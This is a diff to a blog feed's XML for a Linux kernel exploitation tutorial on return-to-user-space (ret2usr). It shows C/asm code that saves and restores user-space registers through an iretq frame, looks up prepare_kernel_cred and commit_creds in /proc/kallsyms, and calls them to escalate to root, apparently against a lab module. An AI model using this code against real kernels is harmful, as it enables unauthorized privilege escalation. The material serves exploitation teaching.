@@ -184,8 +184,7 @@ Appendix Learning Linux Kernel Exploitation - Part 2</description><content>&lt;h
 &lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
 &lt;/ul></content></item><item><title>Linux Kernel 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Table of Contents User-space vs. Kernel-space Return to User-space Overview Saving the Initial State Restoring the Initial State Escalating Privileges in the Kernel A Vulnerable Kernel Module Exploiting the Kernel Module Environment Setup Building the Exploit User-space vs. Kernel-space &amp;hellip;
 Return to User-space Overview &amp;hellip;
-Saving the Initial State &amp;hellip;
-unsigned long save_ss, save_sp, save_rf, save_cs; void save_user_space() { /* save user-space */ __asm__( &amp;#34;.intel_syntax noprefix;&amp;#34; &amp;#34;mov save_ss, ss;&amp;#34; &amp;#34;mov save_sp, rsp;&amp;#34; &amp;#34;pushf;&amp;#34; &amp;#34;pop save_rf;&amp;#34; &amp;#34;mov save_cs, cs;&amp;#34; &amp;#34;.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
+Saving the Initial State Before we can begin exploitation we will need to find some way to save the current user-space state. This is done as the iretq instruction will use the information saved below in order to return to user-space.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
 &lt;ol>
 &lt;li>&lt;a href="#user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/a>&lt;/li>
 &lt;li>&lt;a href="#return-to-user-space-overview">Return to User-space Overview&lt;/a>&lt;/li>
@@ -202,7 +201,8 @@ unsigned long save_ss, save_sp, save_rf, save_cs; void save_user_space() { /* sa
 &lt;h2 id="return-to-user-space-overview">Return to User-space Overview&lt;/h2>
 &lt;p>&amp;hellip;&lt;/p>
 &lt;h2 id="saving-the-initial-state">Saving the Initial State&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;p>Before we can begin exploitation we will need to find some way to save the current user-space state. This is done as the &lt;code>iretq&lt;/code> instruction will use the information saved below in order to return to user-space.&lt;/p>
+&lt;p>We save the required registers with the assembly code below in order to build our &lt;code>iret&lt;/code> frame to later exit kernel-space.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> save_ss, save_sp, save_rf, save_cs;
 &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">save_user_space&lt;/span>()
 {
@@ -218,7 +218,9 @@ __asm__(
 );
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="restoring-the-initial-state">Restoring the Initial State&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;p>In order to restore the initial state and return to user-space we require two instructions, &lt;code>swapgs&lt;/code> and &lt;code>iretq&lt;/code>. In x86_64 systems the &lt;code>swapgs&lt;/code> instruction must be made before the &lt;code>iretq&lt;/code> instruction as it swaps the &lt;code>gs&lt;/code> register between kernel-mode and user-mode.&lt;/p>
+&lt;p>We next build our &lt;code>iret&lt;/code> frame, containing the information required to return to user-space by pushing our saved user-space registers onto the top of the stack. Finally we make our &lt;code>iretq&lt;/code> instruction to return from kernel-space.&lt;/p>
+&lt;p>Note: At the very top of our &lt;code>iret&lt;/code> frame we put the address we want to return to.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">load_user_space&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> target)
 {
 &lt;span style="color:#75715e">/* return to user-space */&lt;/span>
@@ -241,19 +243,21 @@ __asm__(
 );
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;p>Escalating privileges inside kernel-space is done via two function calls, &lt;code>prepare_kernel_cred&lt;/code> and &lt;code>commit_creds&lt;/code>.&lt;/p>
+&lt;p>The &lt;code>prepare_kernel_cred&lt;/code> function call creates a credentials struct for whatever uid is provided to it (this will almost always be &amp;lsquo;0&amp;rsquo;, for the root user). The &lt;code>commit_creds&lt;/code> function call takes whatever credentials struct is provided to it and applies those privileges to the current user.&lt;/p>
+&lt;p>We can find the address (in kernel-space) of both these functions by reading the &lt;code>/proc/kallsyms&lt;/code> file.&lt;/p>
 &lt;pre>&lt;code>/ # cat /proc/kallsyms | grep prepare_kernel_cred
 ffffffff810881c0 T prepare_kernel_cred
 / # cat /proc/kallsyms | grep commit_creds
 ffffffff81087e80 T commit_creds
-&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
+&lt;/code>&lt;/pre>&lt;p>Using the addresses we found earlier, we can write a bit of assembly that escalates our privileges to that of the root user.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">&lt;span style="color:#a6e22e">xor&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rdi&lt;/span>
 &lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff810881c0&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">prepare_kernel_cred&lt;/span>
 &lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
 &lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#ae81ff">0xffffffff81087e80&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">//&lt;/span> &lt;span style="color:#66d9ef">commit_creds&lt;/span>
 &lt;span style="color:#a6e22e">mov&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rax&lt;/span>
 &lt;span style="color:#a6e22e">call&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s place this inside a function so we can easily use it within our final exploit.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">escalate_privileges&lt;/span>()
 {
 &lt;span style="color:#75715e">/* escalate privileges */&lt;/span>
